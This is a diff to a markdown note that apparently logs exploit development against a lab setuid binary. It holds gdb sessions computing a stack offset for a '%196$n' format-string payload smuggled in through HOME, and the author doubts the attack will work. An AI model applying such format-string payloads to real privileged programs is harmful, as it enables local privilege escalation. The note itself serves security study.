@@ -79,6 +79,21 @@ $3 = 190
 (gdb) p 190 + 6
 $4 = 196
 
->>> gdb --args env -i HOME=$'./%196$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\xf0\xec\xff\xff\xff\x7f' '' ''
-
+// Address is not aligned properly yet
+>>> gdb --args env -i HOME=$'%196$n' ./pseudoyeeeeet VladimirRootin /bin/bash $'\xf0\xec\xff\xff\xff\x7f' '' 'abc'
+(gdb) x/xg argv[3]
+0x7fffffffefd0: 0x00007fffffffecf0
+// Now it is aligned properly
+// Step into snprintf
+(gdb) p $rsp + 8
+$2 = (void *) 0x7fffffffe9e0
+(gdb) p 0x7fffffffefd0 - 0x7fffffffe9e0
+$3 = 1520
+(gdb) p 1520 / 8 + 6
+$4 = 196
 ```
+ - I don't think this will actually work because `snprintf(passwd_path, MAX_PATH_LENGTH, "%.243s/etc/passwd", homedir);` converts `homedir` into a string
+ - If you `printf` the resulting output it might work
+ - Just running `printf(homedir)` on `$'%196$p'` prints off a random address
+
+Figured this out for [[Exploit 3]]
